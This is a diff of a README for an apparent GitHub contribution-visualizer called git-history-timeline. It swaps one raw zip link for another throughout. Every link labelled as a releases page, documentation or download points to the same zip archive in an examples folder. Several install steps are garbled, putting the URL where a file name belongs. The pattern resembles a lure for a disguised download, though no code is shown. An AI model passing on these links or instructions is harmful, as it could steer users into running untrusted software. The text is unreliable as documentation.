@@ -1,6 +1,6 @@
 # 🎨 git-history-timeline - Visualize Your GitHub Contributions Effortlessly
 
-[![Download](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip%https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip)](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip)
+[![Download](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip%https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip)](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ git-history-timeline helps you visualize your GitHub contribution history. This 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip).
+To get started, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip).
 
 1. Go to the GitHub Releases page.
 2. Look for the latest version.
-3. Download the file suitable for your system. It will typically be a `.zip` or `https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip` file.
+3. Download the file suitable for your system. It will typically be a `.zip` or `https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip` file.
 4. Unzip the downloaded file in a folder of your choice.
 
 ## 🛠️ System Requirements
@@ -26,8 +26,8 @@ To get started, visit this page to download: [GitHub Releases Page](https://gith
 After downloading and unzipping:
 
 1. Open the folder where you extracted the files.
-2. Locate the `https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip` file within the folder.
-3. Double-click the `https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip` file. It should open in your default web browser.
+2. Locate the `https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip` file within the folder.
+3. Double-click the `https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip` file. It should open in your default web browser.
 
 You will now see a blank page. Don't worry; we are almost there.
 
@@ -73,10 +73,10 @@ We welcome contributions! If you want to suggest improvements or report bugs, pl
 
 ## 🔗 Learn More
 
-For additional details, features, and updates, please check the [Project Documentation](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip).
+For additional details, features, and updates, please check the [Project Documentation](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip).
 
 ## 📰 Stay Updated
 
 To stay updated with the latest news, please follow this repository on GitHub.
 
-[![Download](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip%https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip)](https://github.com/helloworld718/git-history-timeline/raw/refs/heads/main/examples/history-timeline-git-2.6.zip)
+[![Download](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip%https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip)](https://raw.githubusercontent.com/helloworld718/git-history-timeline/main/examples/git-timeline-history-2.7.zip)
